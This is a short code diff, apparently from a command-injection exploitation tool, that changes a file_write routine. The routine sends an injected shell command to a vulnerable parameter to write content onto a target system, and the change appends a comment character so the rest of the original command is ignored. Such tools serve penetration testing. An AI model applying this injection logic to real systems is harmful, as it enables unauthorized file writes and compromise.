@@ -116,7 +116,9 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
     dest_to_write = path + "\\" + filname 
 
   else:
-    cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
+    cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'" + settings.COMMENT
+    # Comment out the rest payload
+    cmd = cmd + "#"
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     shell = "".join(str(p) for p in shell)
